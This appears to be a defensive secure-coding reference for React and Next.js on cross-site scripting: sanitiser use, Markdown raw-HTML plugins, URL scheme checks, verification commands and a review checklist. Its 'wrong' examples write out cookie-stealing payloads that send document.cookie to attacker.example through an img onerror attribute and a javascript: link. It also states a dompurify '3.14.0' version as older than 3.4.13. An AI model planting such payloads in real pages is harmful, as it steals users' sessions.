# Untrusted markup and injection

Next.js 16.3, React 19.2.6 or later, `isomorphic-dompurify` 3.22.0, `dompurify`
3.4.13, `rehype-sanitize`, TypeScript 5.9. This file owns every place where data
becomes code in the browser. The subjects are the escape that React performs, and
the one prop that turns it off. They also include the sanitiser in front of that
prop, and Markdown that carries raw HTML. The last subjects are the URL that
carries a scheme, and the sinks that React does not touch.

The policy that stops a script the sanitiser missed is
`references/security-headers-and-csp.md`. The endpoint that receives the content,
and the destination that a request reaches, are
`references/exposed-endpoints-and-destinations.md`.

## Principle

Markup is code. A value that reaches the document as markup runs with the
authority of the page.

An escape is the default, and it is correct. Every deliberate step around it is a
decision that a reviewer must be able to find.

Sanitise where the value renders, and never where it arrives. A value that one
path cleans on the way in reaches the document through a second path that nobody
cleaned.

A sanitiser removes what it knows. It runs last, after every transform that can
put markup back.

A cross-site script reads what the browser holds for that origin. It reads the
document, every store that scripts can reach, and every cookie that carries no
`httpOnly`.

## Pinned-stack depth

Each recommendation in this file is current practice at the versions above,
unless the text gives it a different mark. The two other marks are current but in
decline, and alive only in legacy code.

### React escapes a text child, and one prop turns that off

React escapes every string that it renders as a child. A value that holds
`<img src=x onerror=alert(1)>` reaches the page as text, and the browser paints
the characters. No sanitiser is needed for a text child.

```tsx
// Correct: the default path. The value renders as text, whatever it holds.
<p>{comment.body}</p>
```

NEVER reach for `dangerouslySetInnerHTML` to be safe. The prop is the opposite of
safe. It hands the string to the HTML parser, and the parser builds live nodes
from it.

Render raw HTML only where the product needs the markup itself, such as a field
that a content management system fills. Every other case renders text.

### The sink takes a sanitiser output, and a comment names it

```tsx
// Wrong: the stored value reaches the parser with no sanitiser.
// Failure: an author saves <img src=x onerror="fetch('//attacker.example?c='
// + document.cookie)"> in the description field. The script runs on the origin
// of the application for every reader of that page. This is stored cross-site
// scripting.
<div dangerouslySetInnerHTML={{ __html: article.bodyHtml }} />
```

```tsx
// Correct: the sanitiser runs at the point of render, and a comment names it.
import DOMPurify from "isomorphic-dompurify"; // 3.22.0, which pins dompurify 3.4.13

// Sanitiser: DOMPurify, default configuration. The default protocol allowlist
// stands, and ALLOW_UNKNOWN_PROTOCOLS stays off.
const bodyHtml = DOMPurify.sanitize(article.bodyHtml);

<div dangerouslySetInnerHTML={{ __html: bodyHtml }} />;
```

Two things bind every use of the prop. The value is the return of a sanitiser
call. A comment beside it names the sanitiser and the configuration.

The comment is not decoration. A reviewer reads one line and knows which library
cleaned the value, and under which rules. A sink with no such comment is a
finding, even where a sanitiser ran somewhere else.

Take `isomorphic-dompurify` where the same module renders on the server and in
the browser. Take `dompurify` where the code runs in the browser only.

The default protocol allowlist of DOMPurify admits relative URLs, `http`,
`https`, `ftp`, `ftps`, `tel`, `mailto`, `callto`, `sms`, `cid`, `xmpp`, and
`matrix`. Keep that list. `ALLOW_UNKNOWN_PROTOCOLS` opens `javascript:` again,
and it defeats the sanitiser.

CAUTION: a sanitiser that runs when the value is saved protects one write path
only. A second path, an import job, or an older record then reaches the document
uncleaned. Sanitise at render.

### Markdown that carries raw HTML needs the sanitiser after it

```tsx
// Wrong: rehype-raw turns embedded HTML into live nodes.
// Failure: a comment that holds <script> or an onclick attribute becomes real
// DOM. The plugin parses the HTML that the Markdown carries, so the escape that
// Markdown gives by default is gone.
<ReactMarkdown rehypePlugins={[rehypeRaw]}>{comment.body}</ReactMarkdown>
```

```tsx
// Correct: no raw plugin at all. HTML in the source renders as text.
<ReactMarkdown>{comment.body}</ReactMarkdown>
```

```tsx
// Correct: the raw plugin, with the sanitiser after it.
// rehype-sanitize takes the GitHub schema by default.
<ReactMarkdown rehypePlugins={[rehypeRaw, rehypeSanitize]}>
  {comment.body}
</ReactMarkdown>
```

The order is the whole rule. `rehype-sanitize` runs after the last plugin that
can put markup back. A sanitiser in front of `rehype-raw` cleans a tree that the
raw plugin then rebuilds.

Prefer the first correct form. A product that needs no HTML inside Markdown needs
no raw plugin, and the safest configuration is the absent one.

### A URL is a value, and a scheme is code

```tsx
// Wrong: the href comes from a profile field.
// Failure: a user saves javascript:fetch('//attacker.example?c='+document.cookie)
// as the website of the profile. Every reader who presses the link runs it on
// the origin of the application.
<a href={profile.website}>{profile.website}</a>
```

```tsx
// Correct: src/lib/security/safe-url.ts admits two schemes and nothing else.
const ALLOWED_PROTOCOLS = new Set(["http:", "https:"]);

export function safeHref(raw: string): string | null {
  let url: URL;
  try {
    url = new URL(raw);
  } catch {
    return null; // not an absolute URL, so it never becomes an href
  }
  return ALLOWED_PROTOCOLS.has(url.protocol) ? url.href : null;
}
```

Parse the value, then read the parsed protocol. NEVER test the raw string. A
string test passes a value with leading space, a mixed case scheme, or an encoded
character, and the browser still runs it.

The same rule holds for `src` on an `<iframe>` and for any attribute that takes a
URL. A `srcdoc` attribute takes markup rather than a URL, so it is the
`dangerouslySetInnerHTML` rule under another name.

### The sinks that React does not touch

| The sink | What it does | The rule |
| --- | --- | --- |
| `element.innerHTML` | Parses a string into live nodes | Render through React. Where a library needs the call, feed it a sanitiser output. |
| `eval()` and `new Function()` | Runs a string as code | NEVER build either from a value that the program did not write. |
| `document.write()` | Parses a string into the document | Alive only in legacy code. Remove it. |
| `javascript:` in an `href` or a `src` | Runs on a press | Parse the URL, and admit `http` and `https` only. |
| `srcdoc` on an `<iframe>` | Parses markup into a frame | Treat it as raw HTML, and sanitise it. |
| A `message` event from `postMessage` | Delivers a value from another window | It is input from outside the program. `references/boundary-validation-and-api-types.md` states the parse that every such value needs. |

React does not see these calls. A component that reaches for one steps outside
the escape that the framework performs, so the review reads the call itself.

### The escape does not travel with the value

A value that React escapes for HTML is not escaped for another grammar. Three
grammars in this repository each hold their own rule.

- A `<script type="application/ld+json">` block holds JSON, and its content is
  not HTML. Domain 18 `seo-and-metadata` owns that block, and it is not
  integrated yet. Until it lands, treat any value that reaches a JSON-LD block as
  a sink, and never build the block by string concatenation.
- A spreadsheet cell holds a formula grammar.
  `references/cell-formatting-and-export.md` owns the escape for a leading `=`,
  `+`, `-`, `@`, tab, or carriage return.
- A file that the application serves back holds whatever a user uploaded.
  `references/served-content-and-downloads.md` owns the separate origin, the
  `Content-Disposition: attachment` header, and the `nosniff` header.

### Trusted Types is a second layer, and never the first

A Trusted Types policy makes the browser refuse a string at a DOM sink, so a sink
that the review missed fails at run time. Reach the state where the policy is
possible by sanitising first.

Deploy `require-trusted-types-for 'script'` in report-only mode first, and read
the reports for a week. Nobody has proven that a strict policy runs clean
against the inline bootstrap that React 19.2 emits. The report-only run is
therefore the only way to learn what breaks in this stack.

Trusted Types reached a cross-browser baseline in February 2026. Chrome and Edge
shipped it in version 83 of May 2020, Safari in version 26 of September 2025, and
Firefox in February 2026. Treat it as defence in depth until the browser floor of
the product clears February 2026.

### The libraries

The table gives each package its latest version, its last release date, its
maintenance status, and its open advisories. The package registry and the
advisory database supplied those facts on 17 August 2026. A cell that holds no
date is a package with a current registry entry on that date. This file does not
state an exact release date for it.

| Tier | Package | The rule | Latest version | Last release | Maintenance | Open advisories |
| --- | --- | --- | --- | --- | --- | --- |
| Recommend | The React escape of a text child | Every value that needs no markup. It costs nothing and it needs no package. | react 19.2.x | Current | Meta, active | None |
| Recommend | `isomorphic-dompurify` | Raw HTML in a module that renders on the server and in the browser. It pins `dompurify` 3.4.13. | 3.22.0 | 2026-08-06 | Active | None |
| Recommend | `dompurify` | Raw HTML in browser-only code. It is the sanitiser of record, from cure53. | 3.4.13 | 2026-08 | Active | None |
| Recommend | `rehype-sanitize` | Mandatory wherever `rehype-raw` is present. It takes the GitHub schema by default, and it runs after the last unsafe transform. | Current | Current | unified, active | None |
| Conditional | Trusted Types, through `require-trusted-types-for 'script'` | Only as a second layer, and only after a report-only run. The cross-browser baseline is February 2026. | Web platform | — | Baseline since 2026-02 | — |
| Reject | `rehype-raw` with no `rehype-sanitize` after it | The plugin parses embedded HTML into live nodes, which is stored cross-site scripting. | — | — | — | — |
| Reject | `ALLOW_UNKNOWN_PROTOCOLS` in a DOMPurify configuration | It admits `javascript:` again, so the sanitiser stops sanitising. | — | — | — | — |
| Reject | Sanitisation on write, as the only sanitisation | A second write path and every older record reach the document uncleaned. | — | — | — | — |

### What breaks, and how it looks

| Symptom | Cause | Detection | Fix |
| --- | --- | --- | --- |
| A script runs from a comment or an article body | A sink took a value with no sanitiser | Grep for the prop, and read each hit | Sanitise at the point of render, and name the sanitiser in a comment |
| The failure appears in production only | The development data never held a payload | Save a payload into the field, and reload the page | The same fix. Add the payload to the test data |
| Markup renders as text after a library upgrade | The raw plugin left the chain | Read the plugin array | Decide whether the product needs raw HTML at all |
| A link runs code on a press | The href took an unparsed value | Grep for a URL attribute that takes a variable | Parse the URL, and admit `http` and `https` only |
| The sanitiser strips a tag that the product needs | The default schema does not carry it | Read the configuration | Extend the allowlist by name, and never disable the sanitiser |
| A value is clean in the page and dangerous in an export | The escape does not cross a grammar | Open the export file | `references/cell-formatting-and-export.md` holds the escape |

### Version discipline

Read the installed versions before you write code.

React 19.2.6 is the security floor, for the reason that
`references/state-and-effects.md` states.

| The change | Detect the stale idiom | The migration |
| --- | --- | --- |
| `isomorphic-dompurify` 3.22.0 pins `dompurify` 3.4.13 | A direct `dompurify` dependency below 3.4.13 beside it | Take the pin, and delete the direct dependency where the code renders on both sides |
| Some registry mirrors still list `dompurify` 3.14.0 and an older protocol allowlist | A lockfile that resolves below 3.4.13 | Refresh the lockfile against the registry, and read the allowlist from the repository of the project |
| Trusted Types reached a cross-browser baseline in February 2026 | An enforced `require-trusted-types-for` with no report-only run before it | Move to report-only, read the reports, then enforce |

## Verification

```bash
# 1. Read the installed versions before you write code.
rg -n '"react"|"dompurify"|"isomorphic-dompurify"|"rehype-' package.json

# 2. Find every raw HTML sink. Read every hit.
rg -n 'dangerouslySetInnerHTML' -g '*.tsx' src/

# 3. Find a sink whose file names no sanitiser. This prints nothing.
rg --files-with-matches 'dangerouslySetInnerHTML' -g '*.tsx' src/ \
  | xargs rg --files-without-match 'DOMPurify|sanitize'

# 4. Find the raw Markdown plugin. Each hit needs rehype-sanitize after it.
rg -n -A2 'rehypeRaw|rehype-raw' -g '*.tsx' -g '*.ts' src/

# 5. Find a configuration that opens the protocol allowlist. This prints
#    nothing.
rg -n 'ALLOW_UNKNOWN_PROTOCOLS' src/

# 6. Find the sinks that React does not touch. Read every hit.
rg -n 'innerHTML|eval\(|new Function|document\.write|srcdoc' -g '*.ts*' src/

# 7. Find a URL attribute that takes a variable. Each hit passes through the
#    parse helper.
rg -n 'href=\{|src=\{' -g '*.tsx' src/

# 8. Save <img src=x onerror=alert(1)> into every field that renders as HTML.
#    Reload the page. The characters paint, and no dialog opens.

# 9. Save the same payload into a Markdown field. The characters paint.

# 10. Save javascript:alert(1) as a profile link, then press the link. Nothing
#     runs, and the control renders no href.
```

## Review checklist

- [ ] Does every value that needs no markup render as a text child?
- [ ] Is every `dangerouslySetInnerHTML` fed the return of a sanitiser call?
- [ ] Does a comment beside each sink name the sanitiser and its configuration?
- [ ] Does the sanitiser run at the point of render, rather than on write?
- [ ] Is the default protocol allowlist of DOMPurify unchanged?
- [ ] Is `ALLOW_UNKNOWN_PROTOCOLS` absent from every configuration?
- [ ] Is `rehype-raw` either absent, or followed by `rehype-sanitize`?
- [ ] Does `rehype-sanitize` sit after the last plugin that can add markup?
- [ ] Does every URL attribute that takes a variable pass through the parse
      helper?
- [ ] Does that helper admit `http` and `https` only?
- [ ] Is `innerHTML`, `eval`, `new Function`, and `document.write` absent from
      the code that this repository owns?
- [ ] Is every `srcdoc` value sanitised as raw HTML?
- [ ] Is every `postMessage` payload parsed before use?
- [ ] Does a Trusted Types policy run in report-only mode before it enforces?

## Handoffs

- The policy that stops a script the sanitiser missed, `script-src`, the nonce,
  and `frame-ancestors` → `references/security-headers-and-csp.md`.
- The endpoint that stores the content, the destination of an outbound request,
  and the redirect target →
  `references/exposed-endpoints-and-destinations.md`.
- The `NEXT_PUBLIC_` value, the `server-only` guard, the framework security
  floor, and the advisory triage →
  `references/secret-boundary-and-supply-chain.md`.
- The parse that every value from outside the program needs →
  `references/boundary-validation-and-api-types.md`.
- The escape for a leading `=`, `+`, `-`, `@`, tab, or carriage return in an
  export → `references/cell-formatting-and-export.md`.
- The separate origin for a user file, `Content-Disposition: attachment`, and
  `nosniff` → `references/served-content-and-downloads.md`. The
  `dangerouslyAllowSVG` flag and the `remotePatterns` list are
  `references/image-and-video-delivery.md`.
- The React escape as a render rule, the React security floor, and the advisory
  family behind it → `references/state-and-effects.md`.
- The words of a message that a failure produces, and the rule that exception
  text never reaches the reader →
  `references/error-and-empty-state-copy.md`.
- The `"use client"` directive on a component that holds a sink →
  `references/server-and-client-components.md`.
- The JSON-LD block, and the escape that its grammar needs → domain 18
  `seo-and-metadata`. Not integrated yet.
- Injection on the server, template injection, and every server-side sink → the
  sibling skill `secure-code-auditor`. This file owns the browser.
